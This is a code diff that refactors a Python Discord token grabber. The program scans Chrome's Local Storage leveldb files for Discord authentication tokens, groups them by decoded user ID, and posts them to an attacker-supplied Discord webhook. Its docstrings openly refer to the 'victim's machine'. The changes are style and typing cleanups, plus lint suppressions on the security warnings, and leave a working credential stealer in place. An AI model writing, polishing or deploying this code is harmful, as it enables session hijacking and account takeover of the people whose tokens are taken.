@@ -1,65 +1,62 @@
-import re
-import os
+# ruff: noqa: INP001
 import base64
-import typing
 import json
+import os
+import re
 import urllib.request
+from pathlib import Path
 
-
-TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"
+TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"  # noqa: S105
 REQUEST_HEADERS = {
-    "Content-Type":
-        "application/json",
-    "User-Agent":
-        "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11"
+    "Content-Type": "application/json",
+    "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11",
 }
 WEBHOOK_URL = "YOUR WEBHOOK URL"
 
 
-def make_post_request(api_url: str, data: typing.Dict[str, str]) -> int:
-    request = urllib.request.Request(
+def make_post_request(api_url: str, data: dict[str, str]) -> int:
+    if not api_url.startswith(("http", "https")):
+        raise ValueError
+
+    request = urllib.request.Request(  # noqa: S310
         api_url, data=json.dumps(data).encode(),
-        headers=REQUEST_HEADERS
+        headers=REQUEST_HEADERS,
     )
 
-    with urllib.request.urlopen(request) as response:
-        response_status = response.status
-
-    return response_status
+    with urllib.request.urlopen(request) as response:  # noqa: S310
+        return response.status
 
 
-def get_tokens_from_file(file_path: str) -> typing.Union[list[str], None]:
+def get_tokens_from_file(file_path: Path) -> list[str] | None:
 
-    with open(file_path, encoding="utf-8", errors="ignore") as text_file:
-        try:
-            file_contents = text_file.read()
-        except PermissionError:
-            return None
+    try:
+        file_contents = file_path.read_text(encoding="utf-8", errors="ignore")
+    except PermissionError:
+        return None
 
     tokens = re.findall(TOKEN_REGEX_PATTERN, file_contents)
 
-    return tokens if tokens else None
+    return tokens or None
 
 
-def get_user_id_from_token(token: str) -> typing.Union[None, str]:
-    """
-    Confirming that the portion of a string before the first dot can be decoded
-    from base64 offers a useful, though not infallible, method for identifying
+def get_user_id_from_token(token: str) -> str | None:
+    """Confirm that the portion of a string before the first dot can be decoded.
+
+    Decoding from base64 offers a useful, though not infallible, method for identifying
     potential Discord tokens. This is informed by the fact that the initial
     segment of a Discord token usually encodes the user ID in base64. However,
     this test is not guaranteed to be 100% accurate in every case.
 
-    Parameters:
-        token (str): Suspected Discord token represented as a string.
-
-    Returns:
+    Returns
+    -------
         A string representing the Discord user ID to which the token belongs,
         if the first part of the token can be successfully decoded. Otherwise,
         None.
+
     """
     try:
         discord_user_id = base64.b64decode(
-            token.split(".", maxsplit=1)[0] + "=="
+            token.split(".", maxsplit=1)[0] + "==",
         ).decode("utf-8")
     except UnicodeDecodeError:
         return None
@@ -67,10 +64,10 @@ def get_user_id_from_token(token: str) -> typing.Union[None, str]:
     return discord_user_id
 
 
-def get_tokens_from_path(base_path: str) -> typing.Dict[str, set]:
-    """
-    The function collects discord tokens for each user ID to manage the
-    occurrence of both valid and expired Discord tokens, which happens when a
+def get_tokens_from_path(base_path: Path) -> dict[str, set]:
+    """Collect discord tokens for each user ID.
+
+    to manage the occurrence of both valid and expired Discord tokens, which happens when a
     user updates their password, triggering a change in their token. Lacking
     the capability to differentiate between valid and expired tokens without
     making queries to the Discord API, the function compiles every discovered
@@ -78,14 +75,14 @@ def get_tokens_from_path(base_path: str) -> typing.Dict[str, set]:
     validated later, in a process separate from the initial collection and not
     on the victim's machine.
 
-    Parameters:
-        base_path (str): path containing files where tokens may be located.
-    """
-    file_paths = [
-        os.path.join(base_path, filename) for filename in os.listdir(base_path)
-    ]
+    Returns
+    -------
+        user id mapped to a set of potential tokens
 
-    id_to_tokens: typing.Dict[str, set] = dict()
+    """
+    file_paths = [file for file in base_path.iterdir() if file.is_file()]
+
+    id_to_tokens: dict[str, set] = {}
 
     for file_path in file_paths:
         potential_tokens = get_tokens_from_file(file_path)
@@ -104,26 +101,25 @@ def get_tokens_from_path(base_path: str) -> typing.Dict[str, set]:
 
             id_to_tokens[discord_user_id].add(potential_token)
 
-    return id_to_tokens if id_to_tokens else None
+    return id_to_tokens or None
 
 
 def send_tokens_to_webhook(
-    webhook_url: str, user_id_to_token: typing.Dict[str, set[str]]
+    webhook_url: str, user_id_to_token: dict[str, set[str]],
 ) -> int:
-    """
-    Caution: In scenarios where the victim has logged into multiple Discord
+    """Caution: In scenarios where the victim has logged into multiple Discord
     accounts or has frequently changed their password, the accumulation of
     tokens may result in a message that surpasses the character limit,
     preventing it from being sent. There are no plans to introduce code
     modifications to segment the message for compliance with character
     constraints.
-    """
-    fields: list[dict] = list()
+    """  # noqa: D205
+    fields: list[dict] = []
 
     for user_id, tokens in user_id_to_token.items():
         fields.append({
             "name": user_id,
-            "value": "\n".join(tokens)
+            "value": "\n".join(tokens),
         })
 
     data = {"content": "Found tokens", "embeds": [{"fields": fields}]}
@@ -133,11 +129,10 @@ def send_tokens_to_webhook(
 
 def main() -> None:
 
-    chrome_path = os.path.join(
-        os.getenv("LOCALAPPDATA"),
-        r"Google\Chrome\User Data\Default\Local Storage\leveldb"
+    chrome_path = (
+        Path(os.getenv("LOCALAPPDATA")) /
+        "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb"
     )
-
     tokens = get_tokens_from_path(chrome_path)
 
     if tokens is None:
